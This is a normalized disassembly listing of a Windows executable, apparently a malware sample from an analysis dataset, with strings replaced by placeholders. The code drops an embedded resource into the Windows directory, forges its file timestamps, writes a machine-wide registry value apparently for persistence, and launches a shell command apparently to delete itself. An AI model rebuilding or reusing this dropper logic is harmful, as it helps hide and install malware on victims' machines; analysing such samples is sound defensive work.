sub_401000
sub esp 0x180
push ebx
push ebp
push esi
push edi
xor bl bl
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] bl
push 0x80
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x14 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x110 ] bl
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov [ esp + 0x90 ] bl
and ecx 0x3
lea edx [ esp + 0x110 ]
[ edi ] [ esi ]
mov ecx 0x1f
lea edi [ esp + 0x111 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x91 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x90 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
push rw-data
and ecx 0x3
push eax
push rw-data
[ edi ] [ esi ]
push 0x65
call sub_4011c0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x120 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xa0 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xa0 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x124 ]
push ecx
call sub_4012f0
mov esi [ Sleep@IAT ]
add esp 0x18
push 0x7d0
call esi
push rw-data
push rw-data
call sub_401380
add esp 0x8
push 0x1388
call esi
call sub_4014c0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x180
retn
sub_4011c0
sub esp 0x84
push ebx
push ebp
push esi
push edi
push 0x0
call [ GetModuleHandleA@IAT ]
mov ecx [ esp + 0x98 ]
mov esi eax
mov eax [ esp + 0x9c ]
and ecx 0xffff
push eax
push ecx
push esi
call [ FindResourceA@IAT ]
mov edi eax
push edi
push esi
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
push edi
push esi
mov ebx eax
call [ SizeofResource@IAT ]
mov ebp eax
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
lea edx [ esp + 0x14 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0xa0 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0xa4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx edx
push eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x80
push 0x2
mov ecx edx
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x28 ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
mov esi eax
push ebp
push ebx
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x84
retn
sub_4012f0
sub esp 0x18
mov eax [ esp + 0x1c ]
push esi
mov esi [ CreateFileA@IAT ]
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0xc0000000
push eax
call esi
lea ecx [ esp + 0x8 ]
mov edi eax
lea edx [ esp + 0x10 ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
push edi
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x18
retn
mov ecx [ esp + 0x28 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0xc0000000
push ecx
call esi
mov esi eax
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ CloseHandle@IAT ]
call edi
push esi
call edi
sub_401380
sub esp 0x278
push ebx
push esi
push edi
push 0x1f4
lea eax [ esp + 0x94 ]
push rw-data
push eax
mov [ esp + 0x18 ] 0x80000002
call [ strncpy@IAT ]
mov edi [ esp + 0x294 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x90 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x90 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov edx [ esp + 0xc ]
mov ecx ebx
and ecx 0x3
lea eax [ esp + 0xc ]
[ edi ] [ esi ]
push eax
push 0xf003f
lea ecx [ esp + 0x98 ]
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x10 ]
xor eax eax
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x1a
lea edi [ esp + 0x25 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x28c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
lea eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push eax
push 0x2
push 0x0
push rw-data
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x278
retn
sub_4014c0
sub esp 0x30c
lea eax [ esp + 0x208 ]
push esi
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea ecx [ esp + 0x108 ]
push 0x104
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x108 ]
push 0x104
lea eax [ esp + 0x10c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x108 ]
lea eax [ esp + 0x4 ]
push edx
push eax
call esi
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
call esi
push 0x0
lea edx [ esp + 0x8 ]
push 0x0
lea eax [ esp + 0x214 ]
push edx
push eax
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
mov eax 0x1
pop esi
add esp 0x30c
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4016a1
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40168c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
call [ __p___initenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
call sub_401000
add esp 0x30
mov [ ebp - 0x24 ] eax
push eax
call [ exit@IAT ]
push sub_40169e
call [ __setusermatherr@IAT ]
pop ecx
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40168c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40169e
xor eax eax
retn
sub_4016a1
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
